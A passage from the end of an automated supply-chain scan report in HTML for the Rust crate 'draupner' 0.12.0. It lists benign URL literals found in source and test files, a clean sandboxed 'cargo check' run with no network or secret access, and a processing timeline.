+<li><code class="evidence-text">https://${DRUP_HOST_app}/x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L749" rel="noreferrer noopener" target="_blank">src/inject.rs:749</a> </span></li>
+
+<li><code class="evidence-text">https://feat.api.myapp.test/x</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L750" rel="noreferrer noopener" target="_blank">src/inject.rs:750</a> </span></li>
+
+<li><code class="evidence-text">https://feat-x.api.myapp.test</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/inject.rs#L863" rel="noreferrer noopener" target="_blank">src/inject.rs:863</a> </span></li>
+
+<li><code class="evidence-text">local routing ready — reach a worktree at https://&#60;branch&#62;.&#60;svc&#62;.{domain}{}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/remote_check.rs#L121" rel="noreferrer noopener" target="_blank">src/ops/remote_check.rs:121</a> </span></li>
+
+<li><code class="evidence-text">    {name:label_width$}  https://{host}  (:{port})</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/show.rs#L285" rel="noreferrer noopener" target="_blank">src/ops/show.rs:285</a> </span></li>
+
+<li><code class="evidence-text">    {name:label_width$}  https://{host}  (unallocated)</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/show.rs#L286" rel="noreferrer noopener" target="_blank">src/ops/show.rs:286</a> </span></li>
+
+<li><code class="evidence-text">drup show — per-worktree status endpoint.\u{a}\u{a}Human by default. `--json` emits the same data as a structured object:\u{a}\u{a}{\u{a}  &#34;branch&#34;:              original branch name (may contain &#34;/…</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/ops/show.rs#L302" rel="noreferrer noopener" target="_blank">src/ops/show.rs:302</a> </span></li>
+
+<li><code class="evidence-text">https://{host}:{port}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L96" rel="noreferrer noopener" target="_blank">src/setup.rs:96</a> </span></li>
+
+<li><code class="evidence-text">routing is ready — reach a worktree at https://&#60;branch&#62;.&#60;svc&#62;.{domain}{}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/src/setup.rs#L225" rel="noreferrer noopener" target="_blank">src/setup.rs:225</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">test</span> <span class="count">13</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">http://127.0.0.1:{port}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/common/mod.rs#L37" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:37</a> </span></li>
+
+<li><code class="evidence-text">{&#34;domain&#34;:&#34;myapp.test&#34;,&#34;runtime&#34;:&#34;docker&#34;,&#34;repos&#34;:[{&#34;name&#34;:&#34;api&#34;,\u{a}            &#34;env&#34;:{&#34;APP_URL&#34;:&#34;https://${DRUP_HOST_web}&#34;},\u{a}            &#34;scripts&#34;:{&#34;up&#34;:&#34;docker compose config -q &#38;&#38; echo OK&#34;}}]…</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_compose.rs#L272" rel="noreferrer noopener" target="_blank">tests/drup_compose.rs:272</a> </span></li>
+
+<li><code class="evidence-text">APP_URL: &#34;https://feat-a.web.myapp.test&#34;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_compose.rs#L281" rel="noreferrer noopener" target="_blank">tests/drup_compose.rs:281</a> </span></li>
+
+<li><code class="evidence-text">{&#34;domain&#34;:&#34;myapp.test&#34;,&#34;repos&#34;:[{&#34;name&#34;:&#34;api&#34;,\u{a}            &#34;services&#34;:{&#34;app&#34;:{&#34;http&#34;:&#34;api&#34;,&#34;port&#34;:80}},\u{a}            &#34;env&#34;:{&#34;APP_URL&#34;:&#34;https://${DRUP_HOST_app}&#34;},\u{a}            &#34;scripts&#34;:{&#34;up…</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_inject.rs#L89" rel="noreferrer noopener" target="_blank">tests/drup_inject.rs:89</a> </span></li>
+
+<li><code class="evidence-text">URL=https://feat-foo.api.myapp.test</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_inject.rs#L98" rel="noreferrer noopener" target="_blank">tests/drup_inject.rs:98</a> </span></li>
+
+<li><code class="evidence-text">#!/bin/sh\u{a}echo &#39;stack up   https://anchored:8441&#39;\u{a}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_list.rs#L126" rel="noreferrer noopener" target="_blank">tests/drup_list.rs:126</a> </span></li>
+
+<li><code class="evidence-text">https://anchored:8441</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_list.rs#L140" rel="noreferrer noopener" target="_blank">tests/drup_list.rs:140</a> </span></li>
+
+<li><code class="evidence-text">echo &#39;stack up   https://example:8440&#39;</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_list.rs#L148" rel="noreferrer noopener" target="_blank">tests/drup_list.rs:148</a> </span></li>
+
+<li><code class="evidence-text">https://example:8440</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_list.rs#L154" rel="noreferrer noopener" target="_blank">tests/drup_list.rs:154</a> </span></li>
+
+<li><code class="evidence-text">http://127.0.0.1:1</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_remote_check.rs#L145" rel="noreferrer noopener" target="_blank">tests/drup_remote_check.rs:145</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_up.rs#L157" rel="noreferrer noopener" target="_blank">tests/drup_up.rs:157</a> <a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_up.rs#L202" rel="noreferrer noopener" target="_blank">tests/drup_up.rs:202</a> </span></li>
+
+<li><code class="evidence-text">{&#34;repos&#34;:[{&#34;name&#34;:&#34;api&#34;,&#34;kind&#34;:&#34;host&#34;,&#34;services&#34;:{&#34;web&#34;:{&#34;http&#34;:true,&#34;port&#34;:8080}},&#34;scripts&#34;:{&#34;up&#34;:&#34;serve&#34;},&#34;env&#34;:{&#34;APP_URL&#34;:&#34;https://${DRUP_HOST_web}&#34;}}]}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/draupner/0.12.0/code/tests/drup_remote_set.rs#L243" rel="noreferrer noopener" target="_blank">tests/drup_remote_set.rs:243</a> </span></li>
+
+</ul>
+</details>
+
+</div>
+
+
+
+
+<section class="run" id="run-check">
+<div class="run-head">
+  <h2>Run: check</h2>
+  <span class="badge ok">succeeded</span>
+  
+</div>
+
+
+
+
+<dl class="facts">
+<div><dt>Ended</dt><dd>agent reported the end</dd></div><div><dt>Guest</dt><dd>exit code 0</dd></div><div><dt>Run time</dt><dd>411 ms</dd></div><div><dt>VM restore</dt><dd>113 ms</dd></div><div><dt>Payload</dt><dd>3932 files, 115.8 MiB</dd></div><div><dt>Files opened</dt><dd>275</dd></div>
+</dl>
+
+<div class="panel proc">
+<h3>Processes <span class="muted">2</span></h3>
+
+<p class="hint">Siblings that ran the same program with the same result and the same processes below are folded into one row, with their number.
+<label class="toggle"><input type="checkbox" checked> Hide the 1 compiler processes (rustc, C toolchain)</label></p>
+<div class="scroll">
+<table class="tree">
+<thead><tr><th>Process</th><th>Arguments</th><th>Start</th><th>Took</th><th>Exit</th></tr></thead>
+<tbody>
+
+<tr class="role-cargo">
+<td class="d0"><span class="badge role">cargo</span> <span class="mono" title="pid 573: /usr/local/bin/cargo">/usr/local/bin/cargo</span></td>
+<td class="mono args">check --locked --offline</td>
+<td class="nowrap muted">5 ms</td>
+<td class="nowrap">401 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 580: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--crate-name crateward_probe --edition=2021 lib.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type lib --emit=dep-info,metadata -C embed-bitcode=no -C debuginfo=2 --check-cfg cfg(docsrs,test) --check-cfg cfg(feature, values()) -C metadata=d9152fcf76bf9b7f -C extra-filename=-8c7788aadf5d3a75 --out-dir /work/target/debug/deps -C incremental=/work/target/debug/incremental -L dependency=/work/target/debug/deps</td>
+<td class="nowrap muted">185 ms</td>
+<td class="nowrap">212 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+</tbody>
+</table>
+</div>
+
+
+</div>
+
+<div class="panel">
+<h3>Network <span class="muted">0</span></h3>
+
+<p class="muted">No network activity.</p>
+
+</div>
+
+<div class="panel">
+<h3>Files <span class="muted">0</span></h3>
+<h4>Secrets opened</h4>
+<p class="muted">None.</p>
+<h4>Written outside the build directories</h4>
+<p class="muted">None.</p>
+
+</div>
+
+<div class="panel">
+<h3>Scratch disk <span class="muted">0</span></h3>
+
+<dl class="facts">
+<div><dt>Files</dt><dd>21</dd></div><div><dt>Directories</dt><dd>19</dd></div><div><dt>Size</dt><dd>77.8 KiB</dd></div><div><dt>Compiled units</dt><dd>1</dd></div>
+</dl>
+<p class="muted">Nothing outside the build areas.</p>
+
+</div>
+
+<div class="panel">
+<h3>Output</h3>
+
+<details><summary>Standard error</summary><pre>warning: crateward-probe v0.0.0 (/cw/probe) ignoring invalid dependency `target` which is missing a lib target
+    Checking crateward-probe v0.0.0 (/cw/probe)
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.35s
+</pre></details>
+
+</div>
+</section>
+
+
+<details class="section" id="timeline">
+<summary><h2>Timeline</h2> <span class="count">6</span></summary>
+<table>
+<thead><tr><th>When</th><th>From</th><th>To</th><th>Event</th><th>Worker</th></tr></thead>
+<tbody>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">Discovered</td><td class="nowrap">Fetched</td><td>fetched</td><td class="muted">fetcher-286769</td></tr>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">Fetched</td><td class="nowrap">ReadyForSandbox</td><td>static_analysis_completed</td><td class="muted">static-286807</td></tr>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">ReadyForSandbox</td><td class="nowrap">Running</td><td>sandbox_started</td><td class="muted">orchestrator-289279-slot2</td></tr>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">Running</td><td class="nowrap">DynamicallyAnalyzed</td><td>sandbox_completed</td><td class="muted">orchestrator-289279-slot2</td></tr>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">DynamicallyAnalyzed</td><td class="nowrap">Scored</td><td>scored</td><td class="muted">analyzer-289309</td></tr>
+
+<tr><td class="muted nowrap">2026-10-15 14:33 UTC</td><td class="nowrap">Scored</td><td class="nowrap">Done</td><td>finalized</td><td class="muted">analyzer-289309</td></tr>
+
+</tbody>
+</table>
+</details>
+
+</main>
+</body>
+</html>
